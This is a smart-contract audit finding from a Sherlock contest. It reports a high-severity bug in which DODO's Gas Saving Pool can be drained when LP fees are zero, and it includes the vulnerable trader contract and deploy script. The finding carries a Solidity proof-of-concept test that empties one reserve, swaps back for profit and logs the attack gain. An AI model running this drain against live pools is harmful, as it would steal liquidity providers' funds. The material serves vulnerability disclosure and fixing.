{
  "Title": "H-1: Pool can be drained if there are no LP_FEES",
  "Content": "# Issue H-1: Pool can be drained if there are no LP_FEES \n\nSource: https://github.com/sherlock-audit/2023-12-dodo-gsp-judging/issues/122 \n\n## Found by \ncergyk, mstpr-brainbot\n## Summary\nThe pool can be depleted because swaps allow the withdrawal of the entire balance, resulting in a reserve of 0 for a specific asset. When an asset's balance reaches 0, the PMMPricing algorithm incorrectly estimates the calculation of output amounts. Consequently, the entire pool can be exploited using a flash loan by depleting one of the tokens to 0 and then swapping back to the pool whatever is received.\n## Vulnerability Detail\nFirstly, as indicated in the summary, selling quote/base tokens can lead to draining the opposite token in the pool, potentially resulting in a reserve of 0. Consequently, the swapping mechanism permits someone to entirely deplete the token balance within the pool. In such cases, the calculations within the pool mechanism become inaccurate. Therefore, swapping back to whatever has been initially purchased will result in acquiring more tokens, further exacerbating the depletion of the pool.\n\nAllow me to provide a PoC to illustrate this scenario:\n```solidity\nfunction test_poolCanBeDrained() public {\n        // @review 99959990000000000000000 this amount makes the reserve 0\n        // run a fuzz test, to get the logs easily I will just use this value as constant but I found it via fuzzing\n        // selling this amount to the pool will make the quote token reserves \"0\".\n        vm.startPrank(tapir);\n        uint256 _amount = 99959990000000000000000;\n\n        //  Buy shares with tapir, 10 - 10 initiate the pool\n        dai.transfer(address(gsp), 10 * 1e18);\n        usdc.transfer(address(gsp), 10 * 1e6);\n        gsp.buyShares(tapir);\n\n        // make sure the values are correct with my math\n        assertTrue(gsp._BASE_RESERVE_() == 10 * 1e18);\n        assertTrue(gsp._QUOTE_RESERVE_() == 10 * 1e6);\n        assertTrue(gsp._BASE_TARGET_() == 10 * 1e18);\n        assertTrue(gsp._QUOTE_TARGET_() == 10 * 1e6);\n        assertEq(gsp.balanceOf(tapir), 10 * 1e18);\n        vm.stopPrank();\n        \n        // sell such a base token amount such that the quote reserve is 0\n        // I calculated the \"_amount\" already which will make the quote token reserve \"0\"\n        vm.startPrank(hippo);\n        deal(DAI, hippo, _amount);\n        dai.transfer(address(gsp), _amount);\n        uint256 receivedQuoteAmount = gsp.sellBase(hippo);\n\n        // print the reserves and the amount received by hippo when he sold the base tokens\n        console.log(\"Received quote amount by hippo\", receivedQuoteAmount);\n        console.log(\"Base reserve\", gsp._BASE_RESERVE_());\n        console.log(\"Quote reserve\", gsp._QUOTE_RESERVE_());\n\n        // Quote reserve is 0!!! That means the pool has 0 assets, basically pool has only one asset now!\n        // this behaviour is almost always not a desired behaviour because we never want our assets to be 0 \n        // as a result of swapping or removing liquidity.\n        assertEq(gsp._QUOTE_RESERVE_(), 0);\n\n        // sell the quote tokens received back to the pool immediately\n        usdc.transfer(address(gsp), receivedQuoteAmount);\n\n        // cache whatever received base tokens from the selling back\n        uint256 receivedBaseAmount = gsp.sellQuote(hippo);\n\n        console.log(\"Received base amount by hippo\", receivedBaseAmount);\n        console.log(\"Base target\", gsp._BASE_TARGET_());\n        console.log(\"Quote target\", gsp._QUOTE_TARGET_());\n        console.log(\"Base reserve\", gsp._BASE_RESERVE_());\n        console.log(\"Quote reserve\", gsp._QUOTE_RESERVE_());\n        \n        // whatever received in base tokens are bigger than our first flashloan! \n        // means that we have a profit!\n        assertGe(receivedBaseAmount, _amount);\n        console.log(\"Profit for attack\", receivedBaseAmount - _amount);\n    }\n```\n\nTest results and logs:\n<img width=\"529\" alt=\"image\" src=\"https://github.com/sherlock-audit/2023-12-dodo-gsp-mstpr/assets/120012681/ac3f07f2-281f-485e-b8df-812045f8a88b\">\n\n## Impact\nPool can be drained, funds are lost. Hence, high. Though, this can only happen when there are no \"LP_FEES\". However, when we check the default settings of the deployment, we see [here](https://github.com/sherlock-audit/2023-12-dodo-gsp/blob/af43d39f6a89e5084843e196fc0185abffe6304d/dodo-gassaving-pool/scripts/DeployGSP.s.sol#L22) that the LP_FEE is set to 0. So, it is ok to assume that the LP_FEES can be 0.\n\n## Code Snippet\nhttps://github.com/sherlock-audit/2023-12-dodo-gsp/blob/af43d39f6a89e5084843e196fc0185abffe6304d/dodo-gassaving-pool/contracts/GasSavingPool/impl/GSPTrader.sol#L40-L113\n## Tool used\n\nManual Review\n\n## Recommendation\nDo not allow the pools balance to be 0 or do not let LP_FEE to be 0 in anytime.  \n\n\n\n## Discussion\n\n**sherlock-admin2**\n\n> Escalate\n> \n> Issues #51, #96 and #157 are missing the crucial second step of swapping back to actually drain the pool, and thus describe a low impact.\n> They should be unduplicated from this issue\n\n    You've deleted an escalation for this issue.\n\n**nevillehuang**\n\n@CergyK those are not duplicates, I have removed them already. You might want to remove the escalation.\n\n**CergyK**\n\n> @CergyK those are not duplicates, I have removed them already. You might want to remove the escalation.\n\nThank you, escalation removed\n\n**Skyewwww**\n\nWe have fixed this bug at this PR: https://github.com/DODOEX/dodo-gassaving-pool/pull/15\n\n",
  "Impact": "HIGH",
  "Source": "https://app.sherlock.xyz/audits/contests/135",
  "Code": [
    {
      "filename": "dodo-gassaving-pool/scripts/DeployGSP.s.sol",
      "content": "// SPDX-License-Identifier: MIT\n\npragma solidity 0.8.16;\n\nimport \"../lib/forge-std/src/Script.sol\";\nimport \"../lib/forge-std/src/console.sol\";\n\nimport {GSP} from \"../contracts/GasSavingPool/impl/GSP.sol\";\n\n\ncontract DeployGSP is Script {\n\n    GSP public gsp;\n\n    address constant DAI = 0x6B175474E89094C44Da98b954EedeAC495271d0F;\n    address constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;\n\n    // Init params\n    address constant MAINTAINER = 0x95C4F5b83aA70810D4f142d58e5F7242Bd891CB0;\n    address constant BASE_TOKEN_ADDRESS = DAI;\n    address constant QUOTE_TOKEN_ADDRESS = USDC;\n    uint256 constant LP_FEE_RATE = 0;\n    uint256 constant MT_FEE_RATE = 10000000000000;\n    uint256 constant I = 1000000;\n    uint256 constant K = 500000000000000;\n    bool constant IS_OPEN_TWAP = false;\n\n    function run() public returns (GSP){\n        // Deploy GSP\n        gsp = new GSP();\n\n        // init GSP\n        gsp.init(\n            MAINTAINER,\n            BASE_TOKEN_ADDRESS,\n            QUOTE_TOKEN_ADDRESS,\n            LP_FEE_RATE,\n            MT_FEE_RATE,\n            I,\n            K,\n            IS_OPEN_TWAP\n        );\n\n        return gsp;\n    }\n\n    function testSuccess() public {}\n}"
    },
    {
      "filename": "dodo-gassaving-pool/contracts/GasSavingPool/impl/GSPTrader.sol",
      "content": "/*\n\n    Copyright 2020 DODO ZOO.\n    SPDX-License-Identifier: Apache-2.0\n\n*/\n\npragma solidity 0.8.16;\n\nimport {GSPVault} from \"./GSPVault.sol\";\nimport {DecimalMath} from \"../../lib/DecimalMath.sol\";\nimport {PMMPricing} from \"../../lib/PMMPricing.sol\";\nimport {IDODOCallee} from \"../../intf/IDODOCallee.sol\";\n\n/// @notice this contract deal with swap\ncontract GSPTrader is GSPVault {\n\n    // ============ Events ============\n\n    event DODOSwap(\n        address fromToken,\n        address toToken,\n        uint256 fromAmount,\n        uint256 toAmount,\n        address trader,\n        address receiver\n    );\n\n    event DODOFlashLoan(address borrower, address assetTo, uint256 baseAmount, uint256 quoteAmount);\n\n    event RChange(PMMPricing.RState newRState);\n\n    // ============ Trade Functions ============\n    /**\n     * @notice User sell base tokens, user pay tokens first. Must be used with a router\n     * @dev The base token balance is the actual balance minus the mt fee\n     * @param to The recipient of the output\n     * @return receiveQuoteAmount Amount of quote token received\n     */\n    function sellBase(address to) external nonReentrant returns (uint256 receiveQuoteAmount) {\n        uint256 baseBalance = _BASE_TOKEN_.balanceOf(address(this)) - _MT_FEE_BASE_;\n        uint256 baseInput = baseBalance - uint256(_BASE_RESERVE_);\n        uint256 mtFee;\n        uint256 newBaseTarget;\n        PMMPricing.RState newRState;\n        // calculate the amount of quote token to receive and mt fee\n        (receiveQuoteAmount, mtFee, newRState, newBaseTarget) = querySellBase(tx.origin, baseInput);\n        // transfer quote token to recipient\n        _transferQuoteOut(to, receiveQuoteAmount);\n        // update mt fee in quote token\n        _MT_FEE_QUOTE_ = _MT_FEE_QUOTE_ + mtFee;\n        \n\n        // update TARGET\n        if (_RState_ != uint32(newRState)) {    \n            require(newBaseTarget <= type(uint112).max, \"OVERFLOW\");\n            _BASE_TARGET_ = uint112(newBaseTarget);\n            _RState_ = uint32(newRState);\n            emit RChange(newRState);\n        }\n        // update reserve\n        _setReserve(baseBalance, _QUOTE_TOKEN_.balanceOf(address(this)) - _MT_FEE_QUOTE_);\n\n        emit DODOSwap(\n            address(_BASE_TOKEN_),\n            address(_QUOTE_TOKEN_),\n            baseInput,\n            receiveQuoteAmount,\n            msg.sender,\n            to\n        );\n    }\n\n    /**\n     * @notice User sell quote tokens, user pay tokens first. Must be used with a router\n     * @param to The recipient of the output\n     * @return receiveBaseAmount Amount of base token received\n     */\n    function sellQuote(address to) external nonReentrant returns (uint256 receiveBaseAmount) {\n        uint256 quoteBalance = _QUOTE_TOKEN_.balanceOf(address(this)) - _MT_FEE_QUOTE_;\n        uint256 quoteInput = quoteBalance - uint256(_QUOTE_RESERVE_);\n        uint256 mtFee;\n        uint256 newQuoteTarget;\n        PMMPricing.RState newRState;\n        // calculate the amount of base token to receive and mt fee\n        (receiveBaseAmount, mtFee, newRState, newQuoteTarget) = querySellQuote(\n            tx.origin,\n            quoteInput\n        );\n        // transfer base token to recipient\n        _transferBaseOut(to, receiveBaseAmount);\n        // update mt fee in base token\n        _MT_FEE_BASE_ = _MT_FEE_BASE_ + mtFee;\n\n        // update TARGET\n        if (_RState_ != uint32(newRState)) {\n            require(newQuoteTarget <= type(uint112).max, \"OVERFLOW\");\n            _QUOTE_TARGET_ = uint112(newQuoteTarget);\n            _RState_ = uint32(newRState);\n            emit RChange(newRState);\n        }\n        // update reserve\n        _setReserve((_BASE_TOKEN_.balanceOf(address(this)) - _MT_FEE_BASE_), quoteBalance);\n\n        emit DODOSwap(\n            address(_QUOTE_TOKEN_),\n            address(_BASE_TOKEN_),\n            quoteInput,\n            receiveBaseAmount,\n            msg.sender,\n            to\n        );\n    }\n\n    /**\n     * @notice inner flashloan, pay tokens out first, call external contract and check tokens left\n     * @param baseAmount The base token amount user require\n     * @param quoteAmount The quote token amount user require\n     * @param assetTo The address who uses above tokens\n     * @param data The external contract's callData\n     */\n    function flashLoan(\n        uint256 baseAmount,\n        uint256 quoteAmount,\n        address assetTo,\n        bytes calldata data\n    ) external nonReentrant {\n        _transferBaseOut(assetTo, baseAmount);\n        _transferQuoteOut(assetTo, quoteAmount);\n\n        if (data.length > 0)\n            IDODOCallee(assetTo).DSPFlashLoanCall(msg.sender, baseAmount, quoteAmount, data);\n\n        uint256 baseBalance = _BASE_TOKEN_.balanceOf(address(this)) - _MT_FEE_BASE_;\n        uint256 quoteBalance = _QUOTE_TOKEN_.balanceOf(address(this)) - _MT_FEE_QUOTE_;\n\n        // no input -> pure loss\n        require(\n            baseBalance >= _BASE_RESERVE_ || quoteBalance >= _QUOTE_RESERVE_,\n            \"FLASH_LOAN_FAILED\"\n        );\n\n        // sell quote case\n        // quote input + base output\n        if (baseBalance < _BASE_RESERVE_) {\n            uint256 quoteInput = quoteBalance - uint256(_QUOTE_RESERVE_);\n            (\n                uint256 receiveBaseAmount,\n                uint256 mtFee,\n                PMMPricing.RState newRState,\n                uint256 newQuoteTarget\n            ) = querySellQuote(tx.origin, quoteInput); // revert if quoteBalance<quoteReserve\n            require(\n                (uint256(_BASE_RESERVE_) - baseBalance) <= receiveBaseAmount,\n                \"FLASH_LOAN_FAILED\"\n            );\n            \n            _MT_FEE_BASE_ = _MT_FEE_BASE_ + mtFee;\n            \n            if (_RState_ != uint32(newRState)) {\n                require(newQuoteTarget <= type(uint112).max, \"OVERFLOW\");\n                _QUOTE_TARGET_ = uint112(newQuoteTarget);\n                _RState_ = uint32(newRState);\n                emit RChange(newRState);\n            }\n            emit DODOSwap(\n                address(_QUOTE_TOKEN_),\n                address(_BASE_TOKEN_),\n                quoteInput,\n                receiveBaseAmount,\n                msg.sender,\n                assetTo\n            );\n        }\n\n        // sell base case\n        // base input + quote output\n        if (quoteBalance < _QUOTE_RESERVE_) {\n            uint256 baseInput = baseBalance - uint256(_BASE_RESERVE_);\n            (\n                uint256 receiveQuoteAmount,\n                uint256 mtFee,\n                PMMPricing.RState newRState,\n                uint256 newBaseTarget\n            ) = querySellBase(tx.origin, baseInput); // revert if baseBalance<baseReserve\n            require(\n                (uint256(_QUOTE_RESERVE_) - quoteBalance) <= receiveQuoteAmount,\n                \"FLASH_LOAN_FAILED\"\n            );\n\n            _MT_FEE_QUOTE_ = _MT_FEE_QUOTE_ + mtFee;\n            \n            if (_RState_ != uint32(newRState)) {\n                require(newBaseTarget <= type(uint112).max, \"OVERFLOW\");\n                _BASE_TARGET_ = uint112(newBaseTarget);\n                _RState_ = uint32(newRState);\n                emit RChange(newRState);\n            }\n            emit DODOSwap(\n                address(_BASE_TOKEN_),\n                address(_QUOTE_TOKEN_),\n                baseInput,\n                receiveQuoteAmount,\n                msg.sender,\n                assetTo\n            );\n        }\n\n        _sync();\n\n        emit DODOFlashLoan(msg.sender, assetTo, baseAmount, quoteAmount);\n    }\n\n    // ============ Query Functions ============\n    /**\n     * @notice Return swap result, for query, sellBase side. \n     * @param trader Useless, just to keep the same interface with old version pool\n     * @param payBaseAmount The amount of base token user want to sell\n     * @return receiveQuoteAmount The amount of quote token user will receive\n     * @return mtFee The amount of mt fee charged\n     * @return newRState The new RState after swap\n     * @return newBaseTarget The new base target after swap\n     */\n    function querySellBase(address trader, uint256 payBaseAmount)\n        public\n        view\n        returns (\n            uint256 receiveQuoteAmount,\n            uint256 mtFee,\n            PMMPricing.RState newRState,\n            uint256 newBaseTarget\n        )\n    {\n        PMMPricing.PMMState memory state = getPMMState();\n        (receiveQuoteAmount, newRState) = PMMPricing.sellBaseToken(state, payBaseAmount);\n\n        uint256 lpFeeRate = _LP_FEE_RATE_;\n        uint256 mtFeeRate = _MT_FEE_RATE_;\n        mtFee = DecimalMath.mulFloor(receiveQuoteAmount, mtFeeRate);\n        receiveQuoteAmount = receiveQuoteAmount\n            - DecimalMath.mulFloor(receiveQuoteAmount, lpFeeRate)\n            - mtFee;\n        newBaseTarget = state.B0;\n    }\n    /**\n     * @notice Return swap result, for query, sellQuote side\n     * @param trader Useless, just for keeping the same interface with old version pool\n     * @param payQuoteAmount The amount of quote token user want to sell\n     * @return receiveBaseAmount The amount of base token user will receive\n     * @return mtFee The amount of mt fee charged\n     * @return newRState The new RState after swap\n     * @return newQuoteTarget The new quote target after swap\n     */\n    function querySellQuote(address trader, uint256 payQuoteAmount)\n        public\n        view\n        returns (\n            uint256 receiveBaseAmount,\n            uint256 mtFee,\n            PMMPricing.RState newRState,\n            uint256 newQuoteTarget\n        )\n    {\n        PMMPricing.PMMState memory state = getPMMState();\n        (receiveBaseAmount, newRState) = PMMPricing.sellQuoteToken(state, payQuoteAmount);\n\n        uint256 lpFeeRate = _LP_FEE_RATE_;\n        uint256 mtFeeRate = _MT_FEE_RATE_;\n        mtFee = DecimalMath.mulFloor(receiveBaseAmount, mtFeeRate);\n        receiveBaseAmount = receiveBaseAmount\n            - DecimalMath.mulFloor(receiveBaseAmount, lpFeeRate)\n            - mtFee;\n        newQuoteTarget = state.Q0;\n    }\n}"
    }
  ]
}